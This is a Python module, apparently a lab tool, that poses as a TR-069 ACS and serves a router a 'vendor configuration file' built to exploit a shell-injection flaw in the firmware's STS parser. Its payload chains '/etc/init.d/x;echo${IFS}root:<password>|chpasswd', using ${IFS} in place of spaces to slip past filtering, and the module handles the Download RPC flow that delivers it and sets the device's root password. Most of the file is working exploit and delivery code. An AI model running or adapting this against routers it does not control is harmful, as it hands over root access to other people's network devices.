"""One-device ACS STS root-password update; the secret stays in memory only."""
import json
import re
import secrets
import threading
from http.server import BaseHTTPRequestHandler
from host_network import LabHTTPServer as ThreadingHTTPServer, service_address


def install(engine, settings, run, peer_ip, local_ip, port=8778):
    password = settings.get('root_password', '')
    if not isinstance(password, str) or not re.fullmatch(r'[A-Za-z0-9_.@+\-]{12,64}', password):
        raise ValueError('Root parola biçimi geçersiz.')
    # This firmware's already-verified STS service parser executes this fixed
    # chpasswd operation. The allowlist above prevents shell metacharacters.
    payload = (b'reboot off\n/etc/init.d/x;echo${IFS}root:' + password.encode('ascii') +
               b'|chpasswd&&logger${IFS}-t${IFS}ACS_ROOT_PASS_TEST${IFS}CHPASS_OK||logger${IFS}-t${IFS}ACS_ROOT_PASS_TEST${IFS}CHPASS_FAIL\n')
    del password
    settings['root_password'] = ''
    token = secrets.token_urlsafe(24)
    route = '/root-password/' + token
    command = 'root-password-' + secrets.token_hex(6)
    report = {'status': 'waiting', 'served': False, 'commandKey': command}

    def save(**kw):
        report.update(kw)
        # Never persist the payload, password, URL token, or command body.
        (run / 'root-password-transfer.json').write_text(json.dumps(report))

    save()

    class Receiver(BaseHTTPRequestHandler):
        def log_message(self, *args):
            pass

        def do_GET(self):
            if self.client_address[0] != peer_ip or self.path != route:
                self.send_response(403)
                self.end_headers()
                return
            save(served=True)
            self.send_response(200)
            self.send_header('Content-Length', str(len(payload)))
            self.send_header('Cache-Control', 'no-store')
            self.end_headers()
            self.wfile.write(payload)
            print('[root-password] STS dosyası hedef routera gönderildi', flush=True)

    server = ThreadingHTTPServer((service_address(local_ip), port), Receiver)
    server.daemon_threads = True
    threading.Thread(target=server.serve_forever, daemon=True).start()

    class Handler(engine.ACSHandler):
        def fail(self, why):
            save(status='failed', error=why)
            self.server.state.stage = 'root_password_failed'
            print('[root-password] ROOT_PASSWORD_TRANSFER_FAILED: ' + why, flush=True)
            self._send(204)

        def _handle_rpc_methods_response(self, root, received_id):
            state = self.server.state
            if received_id != state.pending_id:
                self.fail('RPC yanıt kimliği eşleşmedi')
                return
            methods = [node.text or '' for node in root.iter()
                       if engine._local_name(node.tag) == 'string']
            if 'Download' not in methods:
                self.fail('Cihaz Vendor Configuration Download bildirmedi')
                return
            message_id = state.next_id()
            state.pending_id = message_id
            state.stage = 'root_password_response'
            body = ('<cwmp:Download><CommandKey>' + command +
                    '</CommandKey><FileType>3 Vendor Configuration File</FileType>'
                    '<URL>http://' + local_ip + ':' + str(port) + route +
                    '</URL><Username></Username><Password></Password><FileSize>' +
                    str(len(payload)) +
                    '</FileSize><TargetFileName></TargetFileName><DelaySeconds>0</DelaySeconds>'
                    '<SuccessURL></SuccessURL><FailureURL></FailureURL></cwmp:Download>')
            save(status='requested')
            print('[root-password] ROOT_PASSWORD_DOWNLOAD_SENT', flush=True)
            self._send(200, engine._envelope(state.namespace, body, message_id))

        def _handle_extra_rpc(self, rpc_name, message_id, root):
            state = self.server.state
            if rpc_name == 'DownloadResponse':
                if state.stage != 'root_password_response' or message_id != state.pending_id:
                    self.fail('Beklenmeyen Download yanıtı')
                    return True
                status = engine._find_text(root, 'Status')
                if status not in ('0', '1'):
                    self.fail('Geçersiz Download durumu')
                    return True
                if status == '0' and not report['served']:
                    self.fail('Cihaz dosyayı almadan tamamlandı bildirdi')
                    return True
                save(status='waiting_transfer' if status == '1' else 'transfer_reported',
                     downloadStatus=status)
                state.stage = 'root_password_pending'
                if status == '0':
                    print('[root-password] ROOT_PASSWORD_TRANSFER_REPORTED: SSH ile doğrulama gerekli', flush=True)
                self._send(204)
                return True
            if rpc_name == 'TransferComplete':
                key = engine._find_text(root, 'CommandKey')
                fault = engine._find_text(root, 'FaultCode')
                if key == command:
                    transferred = fault == '0' and report['served']
                    save(status='transfer_reported' if transferred else 'failed',
                         transferFaultCode=fault)
                    if transferred:
                        print('[root-password] ROOT_PASSWORD_TRANSFER_REPORTED: SSH ile doğrulama gerekli', flush=True)
                    else:
                        print('[root-password] ROOT_PASSWORD_TRANSFER_FAILED: ACS transfer sonucu başarısız', flush=True)
                self._send(200, engine._envelope(state.namespace,
                                                 '<cwmp:TransferCompleteResponse/>', message_id))
                return True
            return False

        def _handle_profile_fault(self, root, received_id):
            self.fail('SOAP Fault ' + str(engine._find_text(root, 'FaultCode')))

    engine.ACSHandler = Handler
    return server
